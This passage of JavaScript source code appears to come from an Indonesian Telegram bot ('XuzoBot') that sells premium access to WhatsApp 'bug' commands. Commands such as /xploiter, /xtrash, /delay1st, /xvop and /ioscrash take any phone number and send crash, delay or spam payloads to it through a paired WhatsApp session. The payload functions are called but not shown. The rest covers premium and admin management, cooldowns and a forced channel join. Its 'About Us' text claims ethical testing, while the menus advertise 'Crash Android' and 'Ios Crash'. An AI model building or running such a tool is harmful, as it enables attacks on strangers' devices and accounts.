Premium Users: ${formatSeconds(cooldownConfig.premium)}
Owner: ${formatSeconds(cooldownConfig.owner)}
    `.trim();
    
    bot.sendMessage(chatId, newConfig);
  });
});

// ==================== BUG COMMANDS (SIMPLIFIED) ====================
createCommandHandler(/\/xploiter (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetNumber = match[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;

  if (!canUseRestrictedFeatures(userId)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `\`\`\` You Dont Have Acces. \`\`\``,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/UnknownUserZ7" }]] }
    });
  }

  const remainingTime = checkCooldown(userId);
  if (remainingTime > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
  }

  const sock = getSocketForUser(userId);
  if (!sock) {
    return bot.sendMessage(chatId, "❌ Tidak ada session WhatsApp aktif. Gunakan /reqpair terlebih dahulu.");
  }

  try {
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/1azxvy.jpg",
      {
        caption: `
\`\`\`
᳀ 𝗚𝗲𝗻𝗫𝘂𝘇𝗼𝗦𝘆𝘀𝘁𝗲𝗺 ᳀
╰➤ T R A S H
 ▢ ᴛᴀʀɢᴇᴛ : ${targetNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    const progressUI = new ProgressUI(chatId, sentMessage.message_id, targetNumber, 'xploiter');
    
    await progressUI.update(0, '🔄 Mengirim bug...');
    
    await progressUI.updateStages([
      { percent: 10, delay: 1000 },
      { percent: 30, delay: 1000 },
      { percent: 50, delay: 1000 },
      { percent: 70, delay: 1000 },
      { percent: 90, delay: 1000 }
    ]);
    
    logInfo("[PROCES MENGIRIM BUG] TUNGGU HINGGA SELESAI");
    const success = await CursorX(sock, jid);
    
    // SIMPLE FINAL UPDATE - TANPA LOCK
    await progressUI.update(100, success ? '✅ Sukses!' : '❌ Gagal!');
    
    if (success) {
      logInfo("[SUCCESS] Bug berhasil dikirim! 🚀");
    } else {
      logInfo("[FAILED] Gagal mengirim bug ke target");
    }
  } catch (error) {
    logError("Error in /xploiter", error);
    try {
      await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    } catch {}
  }
});

createCommandHandler(/\/xtrash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetNumber = match[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;

  if (!canUseRestrictedFeatures(userId)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `\`\`\` You Dont Have Acces. \`\`\``,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/UnknownUserZ7" }]] }
    });
  }

  const remainingTime = checkCooldown(userId);
  if (remainingTime > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
  }

  const sock = getSocketForUser(userId);
  if (!sock) {
    return bot.sendMessage(chatId, "❌ Tidak ada session WhatsApp aktif. Gunakan /reqpair terlebih dahulu.");
  }

  try {
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/4pc2s5.jpg",
      {
        caption: `
\`\`\`
᳀ 𝗚𝗲𝗻𝗫𝘂𝘇𝗼𝗦𝘆𝘀𝘁𝗲𝗺 ᳀
╰➤ T R A S H ☇ S P A M
 ▢ ᴛᴀʀɢᴇᴛ : ${targetNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    const progressUI = new ProgressUI(chatId, sentMessage.message_id, targetNumber, 'xtrash');
    
    await progressUI.update(0, '🔄 Mengirim bug...');
    
    await progressUI.updateStages([
      { percent: 10, delay: 800 },
      { percent: 30, delay: 800 },
      { percent: 50, delay: 800 },
      { percent: 70, delay: 800 },
      { percent: 90, delay: 800 }
    ]);
    
    logInfo("[PROCES MENGIRIM BUG] TUNGGU HINGGA SELESAI");
    const success = await executeTrashspam(sock, jid);
    
    await progressUI.update(100, success ? '✅ Sukses!' : '❌ Gagal!');
    
    if (success) {
      logInfo("[SUCCESS] Bug berhasil dikirim! 🚀");
    }
  } catch (error) {
    logError("Error in /xtrash", error);
    try {
      await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
    } catch {}
  }
});

createCommandHandler(/\/delay1st (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetNumber = match[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;

  if (!canUseRestrictedFeatures(userId)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `\`\`\` You Dont Have Acces. \`\`\``,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/@UnknownUserZ7" }]] }
    });
  }

  const remainingTime = checkCooldown(userId);
  if (remainingTime > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
  }

  const sock = getSocketForUser(userId);
  if (!sock) {
    return bot.sendMessage(chatId, "❌ Tidak ada session WhatsApp aktif. Gunakan /reqpair terlebih dahulu.");
  }

  try {
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/akyvg4.jpg",
      {
        caption: `
\`\`\`
᳀ 𝗚𝗲𝗻𝗫𝘂𝘇𝗼𝗦𝘆𝘀𝘁𝗲𝗺 ᳀
╰➤ D E L A Y ☇ I N V I S
 ▢ ᴛᴀʀɢᴇᴛ : ${targetNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    const progressUI = new ProgressUI(chatId, sentMessage.message_id, targetNumber, 'delay1st');
    
    await progressUI.update(0, '🔄 Mengirim bug...');
    
    await progressUI.updateStages([
      { percent: 10, delay: 800 },
      { percent: 30, delay: 800 },
      { percent: 50, delay: 800 },
      { percent: 70, delay: 800 },
      { percent: 90, delay: 800 }
    ]);
    
    logInfo("[PROCES MENGIRIM BUG] TUNGGU HINGGA SELESAI");
    const success = await DelayInvis(sock, jid);
    
    await progressUI.update(100, success ? '✅ Sukses!' : '❌ Gagal!');
    
    if (success) {
      logInfo("[SUCCESS] Bug berhasil dikirim! 🚀");
    }
  } catch (error) {
    logError("Error in /delay1st", error);
    try {
      await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
    } catch {}
  }
});

createCommandHandler(/\/xvop (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetNumber = match[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;

  if (!canUseRestrictedFeatures(userId)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `\`\`\` You Dont Have Acces. \`\`\``,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/UnknownUserZ7" }]] }
    });
  }

  const remainingTime = checkCooldown(userId);
  if (remainingTime > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
  }

  const sock = getSocketForUser(userId);
  if (!sock) {
    return bot.sendMessage(chatId, "❌ Tidak ada session WhatsApp aktif. Gunakan /reqpair terlebih dahulu.");
  }

  try {
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/09d0i8.jpg",
      {
        caption: `
\`\`\`
᳀ 𝗚𝗲𝗻𝗫𝘂𝘇𝗼𝗦𝘆𝘀𝘁𝗲𝗺 ᳀
╰➤ D E L A Y ☇ H A R D
 ▢ ᴛᴀʀɢᴇᴛ : ${targetNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    const progressUI = new ProgressUI(chatId, sentMessage.message_id, targetNumber, 'xvop');
    
    await progressUI.update(0, '🔄 Mengirim bug...');
    
    await progressUI.updateStages([
      { percent: 10, delay: 800 },
      { percent: 30, delay: 800 },
      { percent: 50, delay: 800 },
      { percent: 70, delay: 800 },
      { percent: 90, delay: 800 }
    ]);
    
    logInfo("[PROCES MENGIRIM BUG] TUNGGU HINGGA SELESAI");
    const success = await KamilApiBug(sock, jid);
    
    await progressUI.update(100, success ? '✅ Sukses!' : '❌ Gagal!');
    
    if (success) {
      logInfo("[SUCCESS] Bug berhasil dikirim! 🚀");
    }
  } catch (error) {
    logError("Error in /xvop", error);
    try {
      await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
    } catch {}
  }
});

createCommandHandler(/\/ioscrash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetNumber = match[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;

  if (!canUseRestrictedFeatures(userId)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `\`\`\` Извините, у вас нет доступа. Запросите доступ у владельца ( ! ). \`\`\``,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/UnknownUserZ7" }]] }
    });
  }

  const remainingTime = checkCooldown(userId);
  if (remainingTime > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
  }

  const sock = getSocketForUser(userId);
  if (!sock) {
    return bot.sendMessage(chatId, "❌ Tidak ada session WhatsApp aktif. Gunakan /reqpair terlebih dahulu.");
  }

  try {
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/xrdsj8.jpg",
      {
        caption: `
\`\`\`
᳀ 𝗚𝗲𝗻𝗫𝘂𝘇𝗼𝗦𝘆𝘁𝗲𝗺 ᳀
╰➤ C R A S H ☇ I O S
 ▢ ᴛᴀʀɢᴇᴛ : ${targetNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙢 : [░░░░░░░░░░] 0%
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    const progressUI = new ProgressUI(chatId, sentMessage.message_id, targetNumber, 'ioscrash');
    
    await progressUI.update(0, '🔄 Mengirim bug...');
    
    await progressUI.updateStages([
      { percent: 10, delay: 800 },
      { percent: 30, delay: 800 },
      { percent: 50, delay: 800 },
      { percent: 70, delay: 800 },
      { percent: 90, delay: 800 }
    ]);
    
    logInfo("[PROCES MENGIRIM BUG] TUNGGU HINGGA SELESAI");
    const success = await executeCrashios(sock, jid);
    
    await progressUI.update(100, success ? '✅ Sukses!' : '❌ Gagal!');
    
    if (success) {
      logInfo("[SUCCESS] Bug berhasil dikirim! 🚀");
    }
  } catch (error) {
    logError("Error in /ioscrash", error);
    try {
      await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
    } catch {}
  }
});

// ==================== OWNER COMMANDS ====================
createCommandHandler(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await bot.sendMessage(chatId, "⚠️ Fitur /addsender digantikan oleh /reqpair untuk user biasa. Owner tetap bisa gunakan untuk kebutuhan khusus.");
  } catch (error) {
    logError("Error in addbot", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan."
    );
  }
});

createCommandHandler(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    logInfo(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

createCommandHandler(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

createCommandHandler(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /addadmin 6843967527."
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    logInfo(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});

createCommandHandler(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to remove premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Please provide a user ID. Example: /delprem 6843967527"
    );
  }

  const userId = parseInt(match[1]);

  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number."
    );
  }

  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `❌ User ${userId} is not in the premium list.`
    );
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `✅ User ${userId} has been removed from the premium list.`
  );
});

createCommandHandler(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /deladmin 6843967527."
    );
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    logInfo(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});

// ==================== START MENU ====================
createCommandHandler(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();

  const CHANNEL_USERNAME = "@liminalshadow0";

  async function isUserJoinedChannel(userId) {
    try {
      const member = await bot.getChatMember(CHANNEL_USERNAME, userId);
      return ["member", "administrator", "creator"].includes(member.status);
    } catch (err) {
      return false;
    }
  }

  if (!(await isUserJoinedChannel(senderId))) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<b>🚫 AKSES DITOLAK</b>

Kamu <b>WAJIB</b> follow channel berikut terlebih dahulu:

➡️ <b>@liminalshadow0</b>

Setelah follow, klik tombol <b>VERIFIKASI</b> di bawah.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 Follow Channel", url: "https://t.me/liminalshadow0" }],
          [{ text: "✅ Verifikasi", callback_data: "verify_join" }]
        ]
      }
    });
  }

  bot.sendPhoto(chatId, getRandomImage(), {
    caption: `<blockquote><b>XuzoBot System ☇ Succes!</b></blockquote>
 ⬡ Author : Liminal Shadow
 ⬡ Version : 1.0
 ⬡ Prefix : /
 ⬡ Library : Javascript
 ⬡ Runtime : ${runtime}
 ⬡ Date now : ${date}
 
 © — GenXuzoSystem᯽
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝗣𝘂𝗯𝗹𝗶𝗰 𝗠𝗲𝗻𝘂🌐", callback_data: "bugmenu" },
          { text: "𝗔𝗯𝗼𝘂𝘁 𝗨𝘀📔", callback_data: "thanksto" },
        ],
        [{ text: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂🔐", callback_data: "ownermenu" }],
        [
          { text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿🔍", url: "https://t.me/UnknownUserZ7" },
          { text: "𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻📊", url: "https://t.me/liminalshadow0 " },
        ],
      ],
    },
  });
});

// ==================== CALLBACK QUERY HANDLER (FIXED - SIMPLE & STATELESS) ====================
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message?.chat?.id;
  const messageId = callbackQuery.message?.message_id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from?.id;
  const username = callbackQuery.from?.username;

  // SELALU JAWAB CALLBACK QUERY - TANPA SYARAT
  try {
    await bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
  } catch (error) {
    // IGNORE ERROR - callback sudah dijawab atau expired
  }

  // Validasi minimal
  if (!chatId || !messageId || !data || !userId) {
    return;
  }

  updateUserLastActive(userId, username);

  // Cek global maintenance untuk callback query
  const maintenanceStatus = await checkGlobalMaintenance();
  if (maintenanceStatus.maintenance) {
    // Jika allowOwner false atau user bukan owner
    if (!(maintenanceStatus.allowOwner && isOwner(userId))) {
      try {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: `⚠️ GenXuzoSystem Maintenance\nReason: ${maintenanceStatus.reason}`,
          show_alert: true,
        });
      } catch (error) {}
      return;
    }
  }

  // Cek local maintenance
  if (shouldBlock(userId)) {
    try {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "🚧 Maintenance Mode is ON\nPlease wait until maintenance is complete.",
        show_alert: true,
      });
    } catch (error) {}
    return;
  }

  try {
    // Handle specific callbacks dengan alert
    if (data === "verify_join") {
      const CHANNEL_USERNAME = "@liminalshadow0";
      try {
        const member = await bot.getChatMember(CHANNEL_USERNAME, callbackQuery.from.id);
        const isJoined = ["member", "administrator", "creator"].includes(member.status);
        if (!isJoined) {
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "❌ Kamu belum follow @liminalshadow0",
            show_alert: true,
          });
          return;
        }
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "✅ Verifikasi berhasil!",
          show_alert: true,
        });
        await bot.sendMessage(chatId, "🎉 <b>Akses dibuka!</b>\nSilakan ketik /start ulang.", { parse_mode: "HTML" });
        return;
      } catch (err) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "⚠️ Gagal verifikasi. Pastikan channel public & bot ada di channel.",
          show_alert: true,
        });
        return;
      }
    }

    if (data === "view_gallery") {
      const galleryText = `📸 Image Gallery\nTotal: ${imageList.length} images\n\n` +
        imageList.slice(0, 10).map((url, i) => `${i+1}. ${url.substring(0, 50)}...`).join('\n') +
        (imageList.length > 10 ? `\n\n...and ${imageList.length - 10} more` : '');
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: galleryText,
        show_alert: true,
      });
      return;
    }

    // History pagination - stateless, tidak perlu cek usia
    if (data.startsWith("history_prev_") || data.startsWith("history_next_")) {
      try {
        const page = parseInt(data.split("_").pop());
        const perPage = 5;
        
        const historyArray = Array.from(userHistory.values())
          .sort((a, b) => new Date(b.joinedAt) - new Date(a.joinedAt));
        
        const totalPages = Math.max(1, Math.ceil(historyArray.length / perPage));
        
        if (page < 1 || page > totalPages) {
          await safeEditMessage(chatId, messageId, "❌ Halaman tidak valid.", { parse_mode: "Markdown" });
          return;
        }
        
        const start = (page - 1) * perPage;
        const end = start + perPage;
        const pageData = historyArray.slice(start, end);
        
        if (pageData.length === 0) {
          await safeEditMessage(chatId, messageId, "📭 Belum ada data pengguna.", { parse_mode: "Markdown" });
          return;
        }
        
        let text = `📜 *USER HISTORY (Page ${page}/${totalPages})*\n\n`;
        pageData.forEach((user, idx) => {
          const username = user.telegramUsername ? `@${user.telegramUsername}` : user.telegramId;
          const joined = new Date(user.joinedAt).toISOString().split('T')[0];
          text += `${start + idx + 1}. ${username}\n   WA: ${user.waNumber || '-'}\n   ID: ${user.telegramId}\n   Joined: ${joined}\n\n`;
        });
        
        const keyboard = [];
        if (page > 1) keyboard.push({ text: "⬅️ Prev", callback_data: `history_prev_${page - 1}` });
        if (page < totalPages) keyboard.push({ text: "➡️ Next", callback_data: `history_next_${page + 1}` });
        
        await safeEditMessage(chatId, messageId, text, {
          parse_mode: "Markdown",
          reply_markup: keyboard.length > 0 ? { inline_keyboard: [keyboard] } : undefined
        });
        return;
      } catch (error) {
        logError("History pagination error", error);
        return;
      }
    }

    // Menu handling - simple edit dengan fallback
    const newImage = getRandomImage();
    const runtime = getBotRuntime();
    const date = getCurrentDate();
    let newCaption = "";
    let newButtons = [];

    if (data === "bugmenu") {
      newCaption = `<blockquote><b>𝗦𝗲𝗻𝗱𝗲𝗿 𝗗𝗮𝘀𝗵𝗯𝗼𝗮𝗿𝗱📊</b></blockquote>
⦿ /reqpair
  ☇ Add Your Sender
⦿ /list
  ☇ Your Active Sender List
⦿ /clear
  ☇ Clear Your Session
━━━━━━━━━━━━━━━━━━━
<blockquote><b>⚉ 𝗕 𝗨 𝗚 ( 🦠 )</b></blockquote>
⦿ /xploiter
  ☇ Crash Android
⦿ /xtrash number
  ☇ Spam Bug
⦿ /delay1st number
  ☇ Delay Invisible
⦿ /xvop number
  ☇ Delay Hard 
⦿ /ioscrash number
  ☇ Ios Crash 

`;
      newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
    } else if (data === "ownermenu") {
      newCaption = `<blockquote><b>𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂🌟</b></blockquote>
» /history
  ☇ User History
» /cs
  ☇ Complete Statistic
» /bc
  ☇ Broadcast To All User
» /addimg
  ☇ Add Image
» /setcd
  ☇ Set Cooldown Bug
━━━━━━━━━━━━━━━━━━━
<blockquote><b>⚉ 𝗦 𝗘 𝗧 𝗧 𝗜 𝗡 𝗚 - 𝗠 𝗘 𝗡 𝗨 ( ⚙ )</b></blockquote>
⦿ /addprem - id duration
⦿ /delprem - id
⦿ /listprem
⦿ /addadmin - id
⦿ /deladmin - id
⦿ /addsender - 62xxx

`;
      newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
    } else if (data === "thanksto") {
      newCaption = `
<blockquote><b>🚀𝗔𝗯𝗼𝘂𝘁 𝗨𝘀 — 𝗚𝗲𝗻𝗫𝘂𝘇𝗼</b></blockquote>
XuzoBot adalah bot berbasis AI & automation yang dikembangkan untuk kebutuhan eksperimen teknologi, pengujian sistem internal, dan pengelolaan fitur lanjutan pada platform messaging.
Bot ini dirancang dengan fokus pada efisiensi, stabilitas, dan kontrol penuh oleh owner.

Kami membangun XuzoBot sebagai bagian dari ekosistem XuzoAI, dengan tujuan:

🔧 Mengembangkan dan menguji fitur otomatisasi secara terkontrol

🧠 Eksperimen AI, handler pesan, dan manajemen session

⚙️ Riset performa sistem dan simulasi beban tanpa merusak platform publik

🔐 Menjunjung etika pengembangan dan tanggung jawab penggunaan teknologi
`;
      newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
    } else if (data === "mainmenu") {
      newCaption = `<blockquote><b>𝗫𝘂𝘇𝗼𝗕𝗼𝘁🚀</b></blockquote>
 ⬡ Author :  ͞ L͟iminal S͢hado͞w
 ⬡ Version : 1.0
 ⬡ Prefix : /
 ⬡ Library : Javascript
 ⬡ Runtime : ${runtime}
 ⬡ Date now : ${date}
 
 © GenXuzoSystem᯽
`;
      newButtons = [
        [
          { text: "𝗣𝘂𝗯𝗹𝗶𝗰 𝗠𝗲𝗻𝘂🌐", callback_data: "bugmenu" },
          { text: "𝗔𝗯𝗼𝘂𝘁 𝗨𝘀📔", callback_data: "thanksto" },
        ],
        [{ text: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂🔐", callback_data: "ownermenu" }],
        [
          { text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿🔍", url: "https://t.me/UnknownUserZ7" },
          { text: "𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻📊", url: "https://t.me/liminalshadow0" },
        ],
      ];
    }

    if (newCaption) {
      try {
        await bot.editMessageMedia(
          {
            type: "photo",
            media: newImage,
            caption: newCaption,
            parse_mode: "HTML",
          },
          { chat_id: chatId, message_id: messageId }
        );
        
        if (newButtons.length > 0) {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: newButtons },
            { chat_id: chatId, message_id: messageId }
          );
        }
      } catch (err) {
        if (err.message && (
          err.message.includes('message to edit not found') ||
          err.message.includes('message is not modified')
        )) {
          // IGNORE - message sudah sama atau tidak ditemukan
        } else {
          logError("Error editing callback message", err);
        }
      }
    }
  } catch (error) {
    logError(`Callback error: ${data}`, error);
  }
});

// ==================== PERIODIC MAINTENANCE CHECK ====================
// Jalankan setiap 30 detik untuk cek maintenance global
setInterval(async () => {
  await checkGlobalMaintenance();
}, 30000);

// ==================== INISIALISASI ====================
// Cek maintenance saat bot start
(async () => {
  await checkGlobalMaintenance();
  initializeUserSessions();
})();

logInfo("✅ Bot berjalan dengan sistem session per user!");
logInfo(`✅ Maintenance mode: ${isMaintenance() ? "ON 🚧" : "OFF ✅"}`);
logInfo(`✅ Global Maintenance: ${globalMaintenance.maintenance ? "ON 🚧" : "OFF ✅"}`);
logInfo("✅ Cooldown config loaded");
logInfo(`✅ Image gallery: ${imageList.length} images`);
logInfo(`✅ User history: ${userHistory.size} users`);
logInfo(`✅ GitHub OTA Update System: READY`);
logInfo(`✅ GitHub Maintenance System: READY`);
